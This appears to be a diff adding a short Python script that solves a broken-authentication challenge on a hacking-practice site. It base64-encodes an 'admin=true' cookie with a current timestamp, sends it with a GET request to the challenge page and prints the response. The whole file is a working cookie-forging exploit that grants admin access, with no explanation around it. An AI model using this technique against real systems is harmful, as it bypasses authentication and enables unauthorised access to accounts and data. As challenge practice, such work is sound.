@@ -1,0 +1,19 @@
+import base64
+import requests
+import time
+
+# Target URL where the PHP is hosted
+url = 'https://canyouhack.me/tasks/broken/BrokenAuthentication2.php'
+
+# Generate the cookie value
+cookie_value = f"admin=true&timestamp={int(time.time())}"
+encoded_cookie = base64.b64encode(cookie_value.encode()).decode()
+
+# Setting the cookie
+cookies = {'auth': encoded_cookie}
+
+# Making the request with the cookie
+response = requests.get(url, cookies=cookies)
+
+# Print the response
+print(response.text)
